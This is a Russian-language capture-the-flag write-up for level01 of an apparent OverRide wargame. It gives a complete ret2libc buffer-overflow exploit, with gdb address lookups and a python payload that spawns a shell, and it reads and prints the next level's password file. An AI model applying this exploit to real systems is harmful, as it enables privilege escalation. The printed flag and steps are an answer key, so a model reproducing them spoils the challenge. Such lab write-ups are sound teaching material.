Ждёт пароля от админки.
Через gdb disas main можно увидеть, что используются функции:
- puts
- printf
- fgets
- verify_user_name внутренняя функция
- verify_user_pass внутренняя функция

В псевдокоде, переведённом через Cutter, мы видим, что значение user_name сравнивается с "dat_wil"
level01@OverRide:~$ ./level01 dat_wil
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
admin
nope, incorrect password...

Пароль со строкой admin не подходит.

level01@OverRide:~$ ./level01 dat_wil
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....
Enter Password: 
asdasdalkdjasdakladsjjajkdsaasddsdssdssddasdasdasdasdsaasssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss
nope, incorrect password...
Segmentation fault (core dumped)

Нашли сегу, значит можно переполнить и внедрить shellcode для доступа к /bin/sh.

Генерируем значения через https://wiremask.eu/tools/buffer-overflow-pattern-generator/
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? () ------ ищём по адресу на каком символе оффсет (EIP) и получаем 80.
EIP: Он содержит смещение следующей команды, подлежащей выполнению. Относительный адрес отсчитывается от начала сегмента исполняемой задачи. Указатель команд непосредственно недоступен программисту, но он управляется явно командами управления потоком, прерываниями и исключениями 
Соответственно, мы можем вписать найденный логин и вместо пароля отправляемся на сигсев, заполнив 80 символов

Мы можем через python -c флаг вводить данные с помощью пайпа в программу.

level01@OverRide:~$ python -c 'print "dat_wil"' | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

Есть два пути запуска bin/bash - через shellcode либо через системыне вызов system (атака возврата через библиотеку).

Второй вариант предполагает, что мы вместо программы exit будем вызывать system, а system подадим как аргумент bin/sh для запуска.
exit заменяем на system и подаём аргумент /bin/sh. Взлом называется ret2libc, где используется системная библиотека для подстановки собственных комманд.
Сначала узнать надо адрес библиотеки, чтобы узнать адрес /bin/sh после переполнения буфера и получения sigsev
info proc map
        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
         0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fd8000 0xf7fdb000     0x3000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
0xf7e2c000 - вот он адрес от библиотеки /lib32/libc-2.15.so
Теперь через команду find мы подаём два адреса  - адрес начала библиотеки, и адрес конца библиотеки, а третий аргумент - то, что мы ищем
find 0xf7e2c000,0xf7fcc000,"/bin/bash"
по какому адресу находится bin/sh в библиотеке
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec <--- адрес от /bin/sh

Дальше ищем адрес system и exit:

(gdb) info func system
All functions matching regular expression "system":
Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system <--- адрес знаете чего
0xf7f48a50  svcerr_systemerr

(gdb) info func exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit
0xf7e5eba0  on_exit
0xf7e5edb0  __cxa_atexit
0xf7e5ef50  quick_exit
0xf7e5ef80  __cxa_at_quick_exit
0xf7ee45c4  _exit
0xf7f27ec0  pthread_exit
0xf7f2d4f0  __cyg_profile_func_exit
0xf7f4bc30  svc_exit
0xf7f55d80  atexit

Дальше используем python, чтобы сгенерировать логин, мусор на 80 символов,
где сначала вводим адрес system в обратной последовательности, дальше адрес exit для замены и адрес /bin/sh
$ python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > payload
cat payload - | ./level01
- нужен, чтобы передавал через input к level01 программе.
$ whoami
level02
$ cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv